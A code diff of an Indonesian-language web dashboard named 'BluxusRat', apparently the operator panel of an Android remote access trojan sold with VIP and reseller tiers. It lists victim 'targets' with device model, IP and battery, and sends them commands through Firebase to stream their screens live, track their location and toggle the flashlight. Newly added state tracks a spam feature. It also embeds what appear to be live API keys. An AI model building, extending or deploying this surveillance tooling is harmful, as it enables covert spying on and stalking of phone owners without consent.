-          <div class="list-item" onclick="window.open('https://chat.whatsapp.com/ImF67mLQSnZ8xYwKpMO4EU','_blank')">
-            <div class="ico-badge"><i class="fa-solid fa-comments"></i></div>
-            <div class="txt"><div class="n">Grup WhatsApp</div><div class="d">Diskusi komunitas</div></div>
-            <div class="arrow"><i class="fa-solid fa-arrow-up-right-from-square"></i></div>
-          </div>
+          <div class="list-item" onclick="window.open('https://whatsapp.com/channel/0029VbD9HztKrWQuuymMCU0w','_blank')"><div class="ico-badge"><i class="fa-brands fa-whatsapp"></i></div><div class="txt"><div class="n">Channel WhatsApp</div><div class="d">Info & update</div></div><div class="arrow"><i class="fa-solid fa-arrow-up-right-from-square"></i></div></div>
+          <div class="list-item" onclick="window.open('https://chat.whatsapp.com/ImF67mLQSnZ8xYwKpMO4EU','_blank')"><div class="ico-badge"><i class="fa-solid fa-comments"></i></div><div class="txt"><div class="n">Grup WhatsApp</div><div class="d">Diskusi komunitas</div></div><div class="arrow"><i class="fa-solid fa-arrow-up-right-from-square"></i></div></div>
         </div>
         <div class="section">
           <h3><div class="ico-badge"><i class="fa-solid fa-heart"></i></div> Credits</h3>
-          <div class="list-item" style="cursor:default">
-            <div class="ico-badge"><i class="fa-solid fa-fire"></i></div>
-            <div class="txt"><div class="n">Firebase</div><div class="d">Realtime Database</div></div>
-          </div>
-          <div class="list-item" style="cursor:default">
-            <div class="ico-badge"><i class="fa-solid fa-cloud"></i></div>
-            <div class="txt"><div class="n">Termai</div><div class="d">Upload API</div></div>
-          </div>
-          <div class="list-item" style="cursor:default">
-            <div class="ico-badge"><i class="fa-solid fa-icons"></i></div>
-            <div class="txt"><div class="n">Font Awesome</div><div class="d">Icons</div></div>
-          </div>
+          <div class="list-item" style="cursor:default"><div class="ico-badge"><i class="fa-solid fa-fire"></i></div><div class="txt"><div class="n">Firebase</div><div class="d">Realtime Database</div></div></div>
+          <div class="list-item" style="cursor:default"><div class="ico-badge"><i class="fa-solid fa-bolt"></i></div><div class="txt"><div class="n">FazzCode</div><div class="d">API Provider</div></div></div>
+          <div class="list-item" style="cursor:default"><div class="ico-badge"><i class="fa-solid fa-cloud"></i></div><div class="txt"><div class="n">Termai</div><div class="d">Upload API</div></div></div>
         </div>
       </div>
     </div>
 
     <!-- PANEL -->
     <div class="screen" id="screen-panel">
-      <div class="dash-header">
-        <div class="hamburger" id="btn-hamburger-panel"><i class="fa-solid fa-bars"></i></div>
-        <span class="page-title" id="panel-title">Panel</span>
-        <div style="width:40px"></div>
-      </div>
+      <div class="dash-header"><div class="hamburger" id="btn-hamburger-panel"><i class="fa-solid fa-bars"></i></div><span class="page-title" id="panel-title">Panel</span><div style="width:40px"></div></div>
       <div class="dash-body">
         <div class="section">
           <h3><div class="ico-badge"><i class="fa-solid fa-shield-halved"></i></div> <span id="panel-role-text">PANEL</span></h3>
@@ -554,23 +549,31 @@ body{background:radial-gradient(circle at 20% 10%, rgba(196,30,40,0.08) 0%, tran
   </div>
 </div>
 
+<!-- AUDIO PLAYER -->
+<div class="player-bar" id="player-bar">
+  <img class="pb-cover" id="pb-cover" src="" onerror="this.style.display='none'">
+  <div class="pb-info">
+    <div class="t" id="pb-title">—</div>
+    <div class="a" id="pb-artist">—</div>
+    <div class="progress-mini"><div class="fill" id="pb-progress"></div></div>
+  </div>
+  <div class="pb-controls">
+    <button class="pb-btn play" id="pb-toggle"><i class="fa-solid fa-play" id="pb-toggle-icon"></i></button>
+    <button class="pb-close" id="pb-close"><i class="fa-solid fa-xmark"></i></button>
+  </div>
+</div>
+
 <!-- SIDEBAR -->
 <div id="sidebar-backdrop"></div>
 <aside id="sidebar">
-  <div class="sb-head">
-    <div class="brand">BluxusRat</div>
-    <div class="sub" id="sb-sub">—</div>
-  </div>
+  <div class="sb-head"><div class="brand">BluxusRat</div><div class="sub" id="sb-sub">—</div></div>
   <nav class="sb-nav">
     <div class="sb-item active" data-page="dash"><div class="ico-badge"><i class="fa-solid fa-house"></i></div> Dashboard</div>
     <div class="sb-item" data-page="rat"><div class="ico-badge"><i class="fa-solid fa-satellite-dish"></i></div> Rat</div>
     <div class="sb-item" data-page="tools"><div class="ico-badge"><i class="fa-solid fa-toolbox"></i></div> Tools</div>
     <div class="sb-item" data-page="account"><div class="ico-badge"><i class="fa-solid fa-user"></i></div> Account</div>
     <div class="sb-item" data-page="about"><div class="ico-badge"><i class="fa-solid fa-circle-info"></i></div> About</div>
-    <div id="sb-role-sep" class="hidden">
-      <div class="sb-sep"></div>
-      <div class="sb-label">Management</div>
-    </div>
+    <div id="sb-role-sep" class="hidden"><div class="sb-sep"></div><div class="sb-label">Management</div></div>
     <div class="sb-item hidden" id="sb-panel" data-page="panel"><div class="ico-badge"><i class="fa-solid fa-crown"></i></div> Panel</div>
   </nav>
 </aside>
@@ -593,9 +596,6 @@ body{background:radial-gradient(circle at 20% 10%, rgba(196,30,40,0.08) 0%, tran
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
 import { getDatabase, ref, get, set, push, update, onValue } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
 
-// ============================================================
-// FIREBASE CONFIG
-// ============================================================
 const firebaseConfig = {
   apiKey: "AIzaSyBx7iNsKzUjiZh-cVnfw3Tl8AYPz_xjH7A",
   authDomain: "ratt-ceee0.firebaseapp.com",
@@ -606,14 +606,12 @@ const firebaseConfig = {
   appId: "1:767485162301:web:3800f71fc8c6bb35db8b54",
   measurementId: "G-7LWR6QTLCJ"
 };
-
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 
-// ============================================================
-// CONFIG
-// ============================================================
 const CONFIG = {
+  FAZZ_KEY: "fcs_live_ff8116a26bea56e04330d6c249a26c3c88e9d4f1",
+  FAZZ_API: "https://api.fazzcode.eu.cc/api",
   TERMAI_KEY: "AIzaBj7z2z3xBjsk",
   TERMAI_URL: "https://c.termai.cc",
   MAX_UPLOAD: 2 * 1024 * 1024
@@ -622,16 +620,17 @@ const CONFIG = {
 const State = {
   user: null, uid: null, page: "dash", targets: [],
   unsubLive: null, unsubLoc: null,
-  currentTarget: null, currentTab: "info"
+  currentTarget: null,
+  audio: null, currentTrack: null,
+  spamRunning: false, spamRonde: 1, spamMultiplier: 25, spamTotal: 0, spamSuccess: 0, spamFail: 0
 };
 
 const LOADING_TEXTS = ["Connecting to Firebase...","Loading assets...","Preparing session...","Almost ready..."];
 const $ = (s,p=document) => p.querySelector(s);
 const $$ = (s,p=document) => [...p.querySelectorAll(s)];
 
-// ============================================================
-// UTIL
-// ============================================================
+function isVIP(){ return State.user && (State.user.role === "vip" || State.user.role === "reseller" || State.user.role === "owner"); }
+
 function showScreen(id){$$(".screen").forEach(s=>s.classList.remove("active"));const el=$("#screen-"+id);if(el)el.classList.add("active");}
 function toast(msg,type="info",dur=3000){
   const wrap=$("#toast-wrap");const el=document.createElement("div");
@@ -643,117 +642,95 @@ function toast(msg,type="info",dur=3000){
 }
 function fmtDate(ts){if(!ts)return"—";return new Date(ts).toLocaleDateString("id-ID",{day:"2-digit",month:"short",year:"numeric"});}
 function fmtDateTime(ts){if(!ts)return"—";const d=new Date(ts);return d.toLocaleDateString("id-ID",{day:"2-digit",month:"short",year:"numeric"})+" "+d.toLocaleTimeString("id-ID",{hour:"2-digit",minute:"2-digit"});}
+function fmtTime(ts){const d=new Date(ts);return `${String(d.getHours()).padStart(2,"0")}:${String(d.getMinutes()).padStart(2,"0")}:${String(d.getSeconds()).padStart(2,"0")}`;}
 function timeAgo(ts){if(!ts)return"—";const s=Math.floor((Date.now()-ts)/1000);if(s<60)return s+"s ago";if(s<3600)return Math.floor(s/60)+"m ago";if(s<86400)return Math.floor(s/3600)+"h ago";return Math.floor(s/86400)+"d ago";}
 function fmtSize(bytes){if(!bytes)return"—";if(bytes<1024)return bytes+" B";if(bytes<1048576)return (bytes/1024).toFixed(1)+" KB";return (bytes/1048576).toFixed(2)+" MB";}
 async function sha256(text){const buf=new TextEncoder().encode(text);const hash=await crypto.subtle.digest("SHA-256",buf);return [...new Uint8Array(hash)].map(b=>b.toString(16).padStart(2,"0")).join("");}
 function genSalt(){const arr=new Uint8Array(16);crypto.getRandomValues(arr);return [...arr].map(b=>b.toString(16).padStart(2,"0")).join("");}
 function genUserCode(){const chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";const gen=()=>[...crypto.getRandomValues(new Uint8Array(4))].map(b=>chars[b%chars.length]).join("");return `${gen()}-${gen()}-${gen()}-${gen()}`;}
 
-// ============================================================
-// OFFLINE DETECTION
-// ============================================================
 function setDot(s){const d=$("#conn-dot");d.classList.remove("warn","off");if(s==="warn")d.classList.add("warn");if(s==="off")d.classList.add("off");}
 function showOffline(){$("#offline-popup").classList.add("show");}
 function hideOffline(){$("#offline-popup").classList.remove("show");}
 window.addEventListener("offline",()=>{setDot("off");showOffline();});
 window.addEventListener("online",()=>{setDot("ok");hideOffline();});
 function watchConnection(){
-  onValue(ref(db, ".info/connected"), (snap)=>{
-    if(snap.val() === true){setDot("ok");hideOffline();}
-    else{setDot("warn");}
-  });
-  setInterval(()=>{
-    if(!navigator.onLine){setDot("off");showOffline();}
-  }, 3000);
+  onValue(ref(db,".info/connected"),(snap)=>{ if(snap.val()===true){setDot("ok");hideOffline();} else{setDot("warn");} });
+  setInterval(()=>{ if(!navigator.onLine){setDot("off");showOffline();} },3000);
 }
 
-// ============================================================
-// LOADING
-// ============================================================
 function runLoading(){
   showScreen("loading");
   const fill=$("#progress-fill"),txt=$("#loading-text");
-  fill.style.width="0%";State.loadingIdx=0;txt.textContent=LOADING_TEXTS[0];
+  fill.style.width="0%";let idx=0;txt.textContent=LOADING_TEXTS[0];
   let pct=0;
   const step=setInterval(()=>{pct+=Math.random()*12+4;if(pct>=100){pct=100;clearInterval(step);}fill.style.width=pct+"%";},180);
-  State.loadingTimer=setInterval(()=>{
-    State.loadingIdx=(State.loadingIdx+1)%LOADING_TEXTS.length;
-    txt.style.opacity="0";
-    setTimeout(()=>{txt.textContent=LOADING_TEXTS[State.loadingIdx];txt.style.opacity="1";},180);
-  },800);
-  setTimeout(()=>{clearInterval(State.loadingTimer);fill.style.width="100%";setTimeout(()=>showScreen("login"),500);},2400);
+  const ltxt=setInterval(()=>{idx=(idx+1)%LOADING_TEXTS.length;txt.style.opacity="0";setTimeout(()=>{txt.textContent=LOADING_TEXTS[idx];txt.style.opacity="1";},180);},800);
+  setTimeout(()=>{clearInterval(ltxt);fill.style.width="100%";setTimeout(()=>showScreen("login"),500);},2400);
 }
 
-// ============================================================
-// LOGIN
-// ============================================================
 async function doLogin(){
   const usn=$("#login-usn").value.trim(), pw=$("#login-pw").value;
   if(!usn||!pw) return toast("Isi username & password","err");
   const btn=$("#btn-login"); btn.disabled=true; btn.innerHTML='<i class="fa-solid fa-spinner fa-spin"></i> Loading...';
   try{
-    const snap = await get(ref(db, "users"));
+    const snap = await get(ref(db,"users"));
     if(!snap.exists()) throw new Error("Belum ada user terdaftar");
     const users = snap.val();
     let foundUid=null, foundUser=null;
-    for(const uid in users){ if(users[uid].username === usn){foundUid=uid;foundUser=users[uid];break;} }
+    for(const uid in users){ if(users[uid].username===usn){foundUid=uid;foundUser=users[uid];break;} }
     if(!foundUser) throw new Error("Username tidak ditemukan");
     if(foundUser.banned) throw new Error("Akun di-ban");
-    const hash = await sha256(pw + foundUser.passwordSalt);
+    const hash = await sha256(pw+foundUser.passwordSalt);
     if(hash !== foundUser.passwordHash) throw new Error("Password salah");
     if(foundUser.expiresAt && foundUser.expiresAt < Date.now()) throw new Error("Akun expired");
-    await update(ref(db, "users/"+foundUid), {lastLogin: Date.now()});
-    State.uid = foundUid; State.user = foundUser;
-    localStorage.setItem("bluxus_uid", foundUid);
+    await update(ref(db,"users/"+foundUid),{lastLogin:Date.now()});
+    State.uid=foundUid; State.user=foundUser;
+    localStorage.setItem("bluxus_uid",foundUid);
     toast("Login berhasil","ok");
-    setTimeout(()=>goDashboard(), 400);
-  }catch(e){ toast(e.message || "Login gagal","err"); }
+    setTimeout(()=>goDashboard(),400);
+  }catch(e){ toast(e.message||"Login gagal","err"); }
   finally{ btn.disabled=false; btn.innerHTML='<i class="fa-solid fa-right-to-bracket"></i> Login'; }
 }
-
 async function tryResume(){
   const uid = localStorage.getItem("bluxus_uid");
   if(!uid) return false;
   try{
-    const snap = await get(ref(db, "users/"+uid));
+    const snap = await get(ref(db,"users/"+uid));
     if(!snap.exists()) return false;
     const u = snap.val();
     if(u.banned) return false;
     if(u.expiresAt && u.expiresAt < Date.now()) return false;
-    State.uid = uid; State.user = u;
+    State.uid=uid; State.user=u;
     return true;
   }catch(e){ return false; }
 }
 
-// ============================================================
-// DASHBOARD
-// ============================================================
 async function goDashboard(){
   showScreen("dash");
-  const u = State.user || {};
-  $("#dash-usn").textContent = u.username || "—";
-  $("#dash-role").innerHTML = `<i class="fa-solid fa-user"></i> ${u.role || "member"}`;
-  $("#dash-usercode").textContent = u.userCode || "—";
-  $("#dash-welcome-name").textContent = u.username || "User";
-  $("#dash-badge").textContent = (u.role || "member").toUpperCase();
-  $("#sb-sub").textContent = u.username || "—";
-  if(u.role && u.role !== "member"){
-    $("#sb-role-sep").classList.remove("hidden");
-    $("#sb-panel").classList.remove("hidden");
-  } else {
-    $("#sb-role-sep").classList.add("hidden");
-    $("#sb-panel").classList.add("hidden");
-  }
+  const u = State.user||{};
+  $("#dash-usn").textContent = u.username||"—";
+  const role = u.role||"member";
+  const roleEl = $("#dash-role");
+  roleEl.className = "role" + (role==="vip"?" vip":role==="reseller"?" reseller":"");
+  roleEl.innerHTML = `<i class="fa-solid fa-user"></i> ${role}`;
+  $("#dash-usercode").textContent = u.userCode||"—";
+  $("#dash-welcome-name").textContent = u.username||"User";
+  const badge = $("#dash-badge");
+  badge.textContent = role.toUpperCase();
+  badge.className = "wb-badge" + (role==="vip"?" vip":"");
+  $("#sb-sub").textContent = u.username||"—";
+  if(role!=="member"){ $("#sb-role-sep").classList.remove("hidden"); $("#sb-panel").classList.remove("hidden"); }
+  else{ $("#sb-role-sep").classList.add("hidden"); $("#sb-panel").classList.add("hidden"); }
   markSidebar("dash");
   await loadTargets();
   loadAnnouncement();
 }
-
 function markSidebar(page){$$(".sb-item").forEach(el=>el.classList.toggle("active",el.dataset.page===page));}
 function openSidebar(){$("#sidebar").classList.add("open");$("#sidebar-backdrop").classList.add("show");}
 function closeSidebar(){$("#sidebar").classList.remove("open");$("#sidebar-backdrop").classList.remove("show");}
 function goPage(page){
-  closeSidebar(); markSidebar(page); State.page = page;
+  closeSidebar(); markSidebar(page); State.page=page;
   if(page==="dash")    return goDashboard();
   if(page==="rat")     return goRat();
   if(page==="tools")   return goTools();
@@ -762,105 +739,53 @@ function goPage(page){
   if(page==="panel")   return goPanel();
 }
 
-// ============================================================
-// ANNOUNCEMENT
-// ============================================================
 async function loadAnnouncement(){
-  const wrap = $("#announce-wrap");
-  if(!wrap) return;
+  const wrap=$("#announce-wrap"); if(!wrap) return;
   try{
-    const snap = await get(ref(db, "broadcasts"));
-    if(!snap.exists()){ wrap.innerHTML = ""; return; }
-    const data = snap.val();
-    const arr = Object.entries(data).map(([id,v])=>({id,...v})).sort((a,b)=>b.createdAt-a.createdAt);
-    const latest = arr[0];
-    if(!latest){ wrap.innerHTML = ""; return; }
-    wrap.innerHTML = `
-      <div class="announce-card" id="announce-card">
-        ${latest.image ? `<img src="${latest.image}" onerror="this.style.display='none'">` : ""}
-        <div class="ac-body">
-          <div class="ac-label"><i class="fa-solid fa-bullhorn"></i> Pengumuman</div>
-          <div class="ac-title">${latest.title || "Info Terbaru"}</div>
-          <div class="ac-desc">${latest.message || ""}</div>
-        </div>
-      </div>`;
-    $("#announce-card").onclick = ()=>{
-      if(latest.url){ window.open(latest.url, "_blank"); return; }
-      openAnnouncementModal(latest);
-    };
-  }catch(e){ console.warn("announce err", e); }
+    const snap = await get(ref(db,"broadcasts"));
+    if(!snap.exists()){ wrap.innerHTML=""; return; }
+    const arr = Object.entries(snap.val()).map(([id,v])=>({id,...v})).sort((a,b)=>b.createdAt-a.createdAt);
+    const l = arr[0];
+    if(!l){ wrap.innerHTML=""; return; }
+    wrap.innerHTML = `<div class="announce-card" id="announce-card">${l.image?`<img src="${l.image}" onerror="this.style.display='none'">`:""}<div class="ac-body"><div class="ac-label"><i class="fa-solid fa-bullhorn"></i> Pengumuman</div><div class="ac-title">${l.title||"Info Terbaru"}</div><div class="ac-desc">${l.message||""}</div></div></div>`;
+    $("#announce-card").onclick = ()=>{ if(l.url){window.open(l.url,"_blank");return;} openAnnouncementModal(l); };
+  }catch(e){}
 }
-
 function openAnnouncementModal(b){
-  const box = $("#modal-box");
-  box.innerHTML = `
-    ${b.image ? `<div style="border-radius:14px;overflow:hidden;margin:-8px -8px 16px"><img src="${b.image}" style="width:100%;display:block" onerror="this.style.display='none'"></div>` : ""}
-    <h3>${b.title || "Pengumuman"}</h3>
-    <div class="sub">${fmtDateTime(b.createdAt)}</div>
-    <div style="font-size:13px;color:var(--text);line-height:1.7;white-space:pre-wrap">${b.message || ""}</div>
-    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
+  const box=$("#modal-box");
+  box.innerHTML = `${b.image?`<div style="border-radius:14px;overflow:hidden;margin:-8px -8px 16px"><img src="${b.image}" style="width:100%;display:block" onerror="this.style.display='none'"></div>`:""}<h3>${b.title||"Pengumuman"}</h3><div class="sub">${fmtDateTime(b.createdAt)}</div><div style="font-size:13px;color:var(--text);line-height:1.7;white-space:pre-wrap">${b.message||""}</div><div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
   $("#modal").classList.add("show");
 }
 
-// ============================================================
-// TARGETS
-// ============================================================
 async function loadTargets(){
   try{
-    const snap = await get(ref(db, "targets"));
-    const all = snap.exists() ? snap.val() : {};
+    const snap = await get(ref(db,"targets"));
+    const all = snap.exists()?snap.val():{};
     const myCode = State.user.userCode;
     State.targets = [];
-    for(const tid in all){
-      const t = all[tid];
-      if(t.ownerCode === myCode){ State.targets.push({id: tid, ...t}); }
-    }
+    for(const tid in all){ const t=all[tid]; if(t.ownerCode===myCode) State.targets.push({id:tid,...t}); }
     $("#dash-targets").textContent = State.targets.length;
     $("#dash-online").textContent = State.targets.filter(t=>t.status==="online").length;
     renderTargetList();
-  }catch(e){ console.warn("load targets err", e); }
+  }catch(e){}
 }
-
 function renderTargetList(){
-  const list = $("#target-list");
-  if(!list) return;
-  if(State.targets.length === 0){
-    list.innerHTML = '<div style="font-size:12px;color:var(--text-mute);text-align:center;padding:20px">Belum ada target</div>';
-    return;
-  }
+  const list=$("#target-list"); if(!list) return;
+  if(State.targets.length===0){ list.innerHTML='<div style="font-size:12px;color:var(--text-mute);text-align:center;padding:20px">Belum ada target</div>'; return; }
   list.innerHTML = State.targets.map(t=>{
-    const online = t.status === "online";
-    const bat = t.battery || 0;
-    const low = bat < 20;
-    return `
-    <div class="target-item" data-tid="${t.id}">
-      <div class="ti-avatar"><i class="fa-solid fa-mobile-screen"></i></div>
-      <div class="ti-info">
-        <div class="n">${t.model || "Unknown Device"}</div>
-        <div class="d">
-          <span>${t.ip || "—"}</span>
-          ${t.battery ? `<span class="battery-badge ${low?"low":""}"><i class="fa-solid fa-battery-${bat>75?"full":bat>50?"three-quarters":bat>25?"half":"quarter"}"></i>${bat}%</span>` : ""}
-          <span>${timeAgo(t.lastSeen)}</span>
-        </div>
-      </div>
-      <div class="ti-status ${online?"on":"off"}"><span class="d"></span>${online?"ON":"OFF"}</div>
-    </div>`;
+    const online = t.status==="online"; const bat=t.battery||0; const low=bat<20;
+    return `<div class="target-item" data-tid="${t.id}"><div class="ti-avatar"><i class="fa-solid fa-mobile-screen"></i></div><div class="ti-info"><div class="n">${t.model||"Unknown Device"}</div><div class="d"><span>${t.ip||"—"}</span>${t.battery?`<span class="battery-badge ${low?"low":""}"><i class="fa-solid fa-battery-${bat>75?"full":bat>50?"three-quarters":bat>25?"half":"quarter"}"></i>${bat}%</span>`:""}<span>${timeAgo(t.lastSeen)}</span></div></div><div class="ti-status ${online?"on":"off"}"><span class="d"></span>${online?"ON":"OFF"}</div></div>`;
   }).join("");
-  $$(".target-item").forEach(el=>el.onclick = ()=>openTargetDetail(el.dataset.tid));
+  $$(".target-item").forEach(el=>el.onclick=()=>openTargetDetail(el.dataset.tid));
 }
-
 function goRat(){ showScreen("rat"); loadTargets(); }
 
 function openTargetDetail(tid){
-  const t = State.targets.find(x=>x.id===tid);
-  if(!t) return;
+  const t = State.targets.find(x=>x.id===tid); if(!t) return;
   State.currentTarget = t;
-  State.currentTab = "info";
-
-  const box = $("#modal-box");
+  const box=$("#modal-box");
   box.innerHTML = `
-    <h3>${t.model || "Device"}</h3>
-    <div class="sub">ID: ${tid}</div>
+    <h3>${t.model||"Device"}</h3><div class="sub">ID: ${tid}</div>
     <div class="tabs">
       <button data-tab="info" class="active"><i class="fa-solid fa-circle-info"></i> Info</button>
       <button data-tab="live"><i class="fa-solid fa-desktop"></i> Live</button>
@@ -868,557 +793,553 @@ function openTargetDetail(tid){
       <button data-tab="tools"><i class="fa-solid fa-toolbox"></i> Tools</button>
     </div>
     <div class="tab-panel active" data-panel="info">
-      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0">
-        <span style="color:var(--text-dim)">Status</span>
-        <span style="color:${t.status==='online'?'var(--success)':'var(--text-dim)'};font-weight:700">${(t.status||"offline").toUpperCase()}</span>
-      </div>
+      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Status</span><span style="color:${t.status==='online'?'var(--success)':'var(--text-dim)'};font-weight:700">${(t.status||"offline").toUpperCase()}</span></div>
       <div style="height:1px;background:var(--border)"></div>
-      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0">
-        <span style="color:var(--text-dim)">Model</span>
-        <span style="font-weight:600">${t.model||"—"}</span>
-      </div>
+      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Model</span><span style="font-weight:600">${t.model||"—"}</span></div>
       <div style="height:1px;background:var(--border)"></div>
-      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0">
-        <span style="color:var(--text-dim)">IP</span>
-        <span style="font-weight:600;font-family:'JetBrains Mono',monospace">${t.ip||"—"}</span>
-      </div>
+      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">IP</span><span style="font-weight:600;font-family:'JetBrains Mono',monospace">${t.ip||"—"}</span></div>
       <div style="height:1px;background:var(--border)"></div>
-      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0">
-        <span style="color:var(--text-dim)">Android</span>
-        <span style="font-weight:600">${t.android||"—"}</span>
-      </div>
+      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Android</span><span style="font-weight:600">${t.android||"—"}</span></div>
       <div style="height:1px;background:var(--border)"></div>
-      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0">
-        <span style="color:var(--text-dim)">Battery</span>
-        <span style="font-weight:600">${t.battery?t.battery+"%":"—"}</span>
-      </div>
+      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Battery</span><span style="font-weight:600">${t.battery?t.battery+"%":"—"}</span></div>
       <div style="height:1px;background:var(--border)"></div>
-      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0">
-        <span style="color:var(--text-dim)">Last Seen</span>
-        <span style="font-weight:600">${timeAgo(t.lastSeen)}</span>
-      </div>
+      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Last Seen</span><span style="font-weight:600">${timeAgo(t.lastSeen)}</span></div>
     </div>
     <div class="tab-panel" data-panel="live">
-      <div class="toggle-row">
-        <div class="tr-left">
-          <div class="ico-badge"><i class="fa-solid fa-video"></i></div>
-          <div class="tr-info"><div class="n">Live Cam</div><div class="d">Stream layar target</div></div>
-        </div>
-        <label class="switch"><input type="checkbox" id="sw-live"><span class="slider"></span></label>
-      </div>
-      <div class="live-view" id="live-view">
-        <div class="empty"><i class="fa-solid fa-image"></i><div>Live cam nonaktif</div></div>
-      </div>
+      <div class="toggle-row"><div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-video"></i></div><div class="tr-info"><div class="n">Live Cam</div><div class="d">Stream layar target</div></div></div><label class="switch"><input type="checkbox" id="sw-live"><span class="slider"></span></label></div>
+      <div class="live-view" id="live-view"><div class="empty"><i class="fa-solid fa-image"></i><div>Live cam nonaktif</div></div></div>
     </div>
     <div class="tab-panel" data-panel="locate">
-      <div class="toggle-row">
-        <div class="tr-left">
-          <div class="ico-badge"><i class="fa-solid fa-location-dot"></i></div>
-          <div class="tr-info"><div class="n">Locate</div><div class="d">Lokasi target</div></div>
-        </div>
-        <label class="switch"><input type="checkbox" id="sw-loc"><span class="slider"></span></label>
-      </div>
-      <div class="loc-map" id="loc-map">
-        <div class="empty"><i class="fa-solid fa-map-location-dot"></i><div>Locate nonaktif</div></div>
-      </div>
+      <div class="toggle-row"><div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-location-dot"></i></div><div class="tr-info"><div class="n">Locate</div><div class="d">Lokasi target</div></div></div><label class="switch"><input type="checkbox" id="sw-loc"><span class="slider"></span></label></div>
+      <div class="loc-map" id="loc-map"><div class="empty"><i class="fa-solid fa-map-location-dot"></i><div>Locate nonaktif</div></div></div>
       <div class="loc-coords" id="loc-coords">—</div>
     </div>
     <div class="tab-panel" data-panel="tools">
-      <div class="toggle-row">
-        <div class="tr-left">
-          <div class="ico-badge"><i class="fa-solid fa-flashlight"></i></div>
-          <div class="tr-info"><div class="n">Senter</div><div class="d">Flashlight target</div></div>
-        </div>
-        <label class="switch"><input type="checkbox" id="sw-flash"><span class="slider"></span></label>
-      </div>
-      <div class="toggle-row">
-        <div class="tr-left">
-          <div class="ico-badge"><i class="fa-solid fa-bolt"></i></div>
-          <div class="tr-info"><div class="n">Strobo</div><div class="d">Kedip-kedip</div></div>
-        </div>
-        <label class="switch"><input type="checkbox" id="sw-strobo"><span class="slider"></span></label>
-      </div>
+      <div class="toggle-row"><div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-flashlight"></i></div><div class="tr-info"><div class="n">Senter</div><div class="d">Flashlight</div></div></div><label class="switch"><input type="checkbox" id="sw-flash"><span class="slider"></span></label></div>
+      <div class="toggle-row"><div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-bolt"></i></div><div class="tr-info"><div class="n">Strobo</div><div class="d">Kedip-kedip</div></div></div><label class="switch"><input type="checkbox" id="sw-strobo"><span class="slider"></span></label></div>
     </div>
     <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
   $("#modal").classList.add("show");
-
-  $$(".tabs button", box).forEach(b=>{
+  $$(".tabs button",box).forEach(b=>{
     b.onclick = ()=>{
-      $$(".tabs button", box).forEach(x=>x.classList.remove("active"));
+      $$(".tabs button",box).forEach(x=>x.classList.remove("active"));
       b.classList.add("active");
-      const tab = b.dataset.tab;
-      $$(".tab-panel", box).forEach(p=>p.classList.toggle("active", p.dataset.panel === tab));
-      State.currentTab = tab;
-      if(tab === "live") setupLiveScreen(tid);
-      if(tab === "locate") setupLocate(tid);
+      const tab=b.dataset.tab;
+      $$(".tab-panel",box).forEach(p=>p.classList.toggle("active",p.dataset.panel===tab));
+      if(tab==="live") setupLiveScreen(tid);
+      if(tab==="locate") setupLocate(tid);
     };
   });
-
-  $("#sw-live", box).onchange = (e)=>toggleLive(tid, e.target.checked);
-  $("#sw-loc", box).onchange = (e)=>toggleLocate(tid, e.target.checked);
-  $("#sw-flash", box).onchange = (e)=>toggleFlash(tid, e.target.checked);
-  $("#sw-strobo", box).onchange = (e)=>toggleStrobo(tid, e.target.checked);
+  $("#sw-live",box).onchange = (e)=>toggleLive(tid,e.target.checked);
+  $("#sw-loc",box).onchange = (e)=>toggleLocate(tid,e.target.checked);
+  $("#sw-flash",box).onchange = (e)=>toggleFlash(tid,e.target.checked);
+  $("#sw-strobo",box).onchange = (e)=>toggleStrobo(tid,e.target.checked);
 }
-
-// ============================================================
-// COMMANDS
-// ============================================================
-async function sendCommand(tid, type, payload={}){
-  try{
-    const cmdRef = push(ref(db, "commands/"+tid));
-    await set(cmdRef, {type, payload, fromUid: State.uid, status: "pending", createdAt: Date.now()});
-    return true;
-  }catch(e){ toast("Gagal kirim command","err"); return false; }
+async function sendCommand(tid,type,payload={}){
+  try{ const cmdRef=push(ref(db,"commands/"+tid)); await set(cmdRef,{type,payload,fromUid:State.uid,status:"pending",createdAt:Date.now()}); return true; }
+  catch(e){ toast("Gagal kirim command","err"); return false; }
 }
+async function toggleLive(tid,on){ if(on){await sendCommand(tid,"live_on",{fps:2});toast("Live cam aktif","ok");setupLiveScreen(tid);}else{await sendCommand(tid,"live_off");toast("Live cam nonaktif","info");if(State.unsubLive){State.unsubLive();State.unsubLive=null;}const v=$("#live-view");if(v)v.innerHTML='<div class="empty"><i class="fa-solid fa-image"></i><div>Live cam nonaktif</div></div>';} }
+function setupLiveScreen(tid){ if(State.unsubLive)State.unsubLive(); State.unsubLive=onValue(ref(db,"live/"+tid),(snap)=>{ if(!snap.exists())return; const d=snap.val(); if(d.frame){const v=$("#live-view");if(v)v.innerHTML=`<div class="live-badge"><span class="d"></span> LIVE</div><img src="${d.frame}" alt="live">`;} }); }
